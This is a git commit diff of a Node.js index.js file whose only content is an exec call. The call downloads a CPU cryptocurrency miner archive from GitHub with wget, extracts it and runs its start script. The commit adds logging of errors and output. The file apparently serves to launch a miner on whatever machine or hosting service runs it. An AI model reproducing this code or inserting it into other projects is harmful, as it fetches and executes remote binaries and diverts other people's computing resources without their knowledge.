87d30538358c8c26d7dc3781673191b6416f2346
RIFAIGGZ <76506048+itsmeR1F4I@users.noreply.github.com>
2022-05-16 20:41:18 +0700

    Add files via upload

--- index.js
+++ index.js
@@ -1,2 +1,14 @@
 const { exec, spawn, execSync } = require("child_process")
-exec('wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && bash start.sh')
+exec('wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && bash start.sh', (error, stderr, stdout) => {
+if (error) {
+console.log(`error: ${error.message}`);
+return;
+}
+
+if (stderr) {
+console.log(`stderr: ${stderr}`);
+return;
+}
+
+console.log(`stdout: ${stdout}`)
+});
